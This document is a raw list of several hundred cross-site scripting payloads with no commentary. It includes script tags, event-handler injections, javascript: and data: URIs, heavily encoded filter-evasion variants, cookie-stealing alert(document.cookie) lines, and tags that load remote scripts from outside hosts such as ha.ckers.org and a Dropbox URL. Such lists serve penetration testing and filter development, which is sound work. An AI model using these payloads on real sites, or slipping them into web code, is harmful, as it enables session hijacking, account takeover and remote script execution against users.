<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<div style="font-family:'foo&#10;;color:red;';">LOL
<DIV STYLE="width: expression(alert('XSS'));">
<div/style="width:expression(confirm(1))">X</div> {IE7}
<div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
<embed src="javascript:alert(1)">
eval(a+b+c+d);
exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
exp/*&lt;A STYLE='no\xss&#58;noxss(\"*//*\");
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
foo\’; alert(document.cookie);//’;
<foo" alt="" title="/><img src=url404 onerror=xss(9)>">
<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
<! foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
<? foo="><script>alert(1)</script>">
foo<script>alert(1)</script>
foo<script>alert(document.cookie)</script>
<% foo><x foo="%><script>alert(123)</script>">
<? foo="><x foo='?><script>alert(1)</script>'>">
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
<form><button formaction="javascript:alert(123)">crosssitespt
<form><button formaction="javascript:alert(XSS)">lol
<form><button formaction=javascript&colon;alert(1)>CLICKME
<form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<form><isindex formaction="javascript&colon;confirm(1)"
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<frameset onload=alert(123)>
<h1><font color=blue>hellox worldss</h1>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
http://www.google<script .com>alert(document.location)</script
http://www.<script>alert(1)</script .com
<iframe/%00/ src=javaSCRIPT&colon;alert(1)
<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
<iframe><iframe/><img src=url404 onerror=xss(5)>
<iframe/onreadystatechange=alert(1)
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<iframe src=http://ha.ckers.org/scriptlet.html <
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<iframe/src \/\/onload = prompt(1)
<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<iframe xmlns="#" src="javascript:alert(1)"></iframe>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<img alt="
<img alt="<x" title="/><img src=url404 onerror=xss(0)>">
<img alt="<x" title="" src="/><img src=url404 onerror=xss(10)>">
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
<img/src=`%00` onerror=this.onerror=confirm(1)
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=" &#14;  javascript:alert('XSS');">
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<img src=asdf onerror=alert(document.cookie)>
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
<!--<img src="--><img src=x onerror=alert(123)//">
<!--<img src="--><img src=x onerror=alert(XSS)//">
<![><img src="]><img src=x onerror=alert(XSS)//">
<img src ?itworksonchrome?\/onerror = alert(1)
<img src=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<img src="javascript:alert('XSS');">
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=”jav ascript:alert(‘XSS’);”>
<IMG SRC=”javascript:alert(‘XSS’);”>
<IMG SRC=”javascript:alert(‘XSS’)”
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascript:alert(‘XSS’)>      
<IMG SRC=jAVasCrIPt:alert(‘XSS’)>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascrscriptipt:alert('XSS')>
<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>
<--`<img/src=` onerror=alert(1)> --!>
><img src onerror=alert(1)>
<img src="/" =_=" title="onerror='prompt(1)'">
<img src=url404 onerror=xss(1)>">
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
"><img src=x onerror=window.open('https://www.google.com/');>
<img src=xss onerror=alert(1)>
<img src=`xx:xx`onerror=alert(1)>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
<input onblur=write(XSS) autofocus><input autofocus>
<input onfocus=write(XSS) autofocus>
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
<input value=<><iframe/src=javascript:confirm(1)
javascript:alert("hellox worldss")
LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
&lt
&lt;
&LT
&LT;
&lt;!&#91;endif&#93;--&gt;
&lt;!--&#91;if gte IE 4&#93;&gt;
&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;BASE HREF=\"javascript&#058;alert('XSS');//\"&gt;
&lt;BGSOUND SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;/BODY&gt;&lt;/HTML&gt;
&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;
&lt;BODY ONLOAD=alert('XSS')&gt;
&lt;BR SIZE=\"&{alert('XSS')}\"&gt;
&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
&lt;DIV STYLE=\"width&#58; expression(alert('XSS'));\"&gt;
&lt;? echo('&lt;SCR)';
&lt;EMBED SRC=\"data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
&lt;EMBED SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/FRAMESET&gt;
&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
&lt;HTML&gt;&lt;BODY&gt;
&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
&lt;IFRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/IFRAME&gt;
&lt;IMG DYNSRC=\"javascript&#058;alert('XSS')\"&gt;
&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;
&lt;IMG LOWSRC=\"javascript&#058;alert('XSS')\"&gt;
&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
&lt;IMG SRC=\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;
&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
&lt;IMG SRC=`javascript&#058;alert(\"RSnake says, 'XSS'\")`&gt;
&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS')\"
&lt;IMG SRC=\"   javascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;
&lt;IMG SRC=\"jav&#x09;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;
&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert('XSS'))\"&gt;
&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;
&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;
&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('XSS');\"&gt;
&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;
&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\"&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"
&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert('XSS');\"&gt;
&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\"&gt;
&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;
&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/OBJECT&gt;
&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;document&#46;write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;
&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\")}&lt;/STYLE&gt;
&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;
&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\"XSS\")';&lt;/STYLE&gt;
&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert('XSS')\")}&lt;/STYLE&gt;
&lt;STYLE TYPE=\"text/javascript\"&gt;alert('XSS');&lt;/STYLE&gt;
&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"&gt;
&lt;TABLE BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;
&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\"&gt;&#93;&#93;&gt;
&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;alert('XSS')\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
&lt;XML SRC=\"xsstest&#46;xml\" ID=I&gt;&lt;/XML&gt;
'';!--\"&lt;XSS&gt;=&{()}
&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;
&lt;XSS STYLE=\"xss&#58;expression(alert('XSS'))\"&gt;
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<math><a xlink:href="//jsfiddle.net/t846h/">click
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<noembed><noembed/><img src=url404 onerror=xss(7)>
<noframes><noframes/><img src=url404 onerror=xss(6)>
<noscript/><img src=url404 onerror=xss(11)>
<noscript><noscript/><img src=url404 onerror=xss(8)>
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<option><style></option></select><img src=url404 onerror=xss(12)></style>
perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
perl -e 'print \"&lt;SCR\0IPT&gt;alert(\\"XSS\\")&lt;/SCR\0IPT&gt;\";' &gt; out
</plaintext\></|\><plaintext/onmouseover=prompt(1)
Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
“><s”%2b”cript>alert(document.cookie)</script>
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
<script>({0:#0=alert/#0#/#0#(0)})</script>
<script>({0:#0=alert/#0#/#0#(123)})</script>
<script>+-+-1-+-+alert(1)</script>
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<script ~~~>alert(0%0)</script ~~~>
<script>alert(123);</script>
<script>alert(123)</script>
<%<!--'%><script>alert(1);</script -->
<script>alert(1)</script>
<ScRiPt>alert(1)</sCriPt>
“><<script>alert(document.cookie);//<</script>
“><ScRiPt>alert(document.cookie)</script>
<script>alert("hellox worldss");</script>
<script>alert("hellox worldss")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
<script ^__^>alert(String.fromCharCode(49))</script ^__^
"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
<script>alert(/XSS/)</script>
<script>alert(/XSS”)</script>
<script>alert(‘XSS’)</script>
<script>alert(“XSS”);</script>
<script>alert(“XSS”)</script> 
“><script>alert(“XSS”)</script>
<ScRipT>alert("XSS");</ScRipT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<<SCRIPT>alert(“XSS”);//<</SCRIPT>
<script>alert("XSS");</script>&search=1
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
<script>confirm(1)</script>
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
<script>prompt(1)</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>
</script><script>alert(1)</script>
</script><script >alert(document.cookie)</script>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<script src="#">{alert(1)}</script>;1
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<script src="data:text/javascript,alert(1)"></script>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script x> alert(1) </script 1=2
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<scr<script>ipt>alert(1)</scr</script>ipt>
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
<style><img src="</style><img src=x onerror=alert(123)//">
<style><img src="</style><img src=x onerror=alert(XSS)//">
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<style><style/><img src=url404 onerror=xss(2)>
<svg contentScriptType=text/vbs><script>MsgBox+1
<svg/onload=alert(1)
<svg onload=alert("OpenRemoteReport")><!--
<svg onload="javascript:alert(123)" xmlns="#"></svg>
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
<svg><script ?>alert(1)
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
<svg xmlns="#"><script>alert(1)</script></svg>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
<title><title /><img src=url404 onerror=xss(4)>
\u003c
\u003C
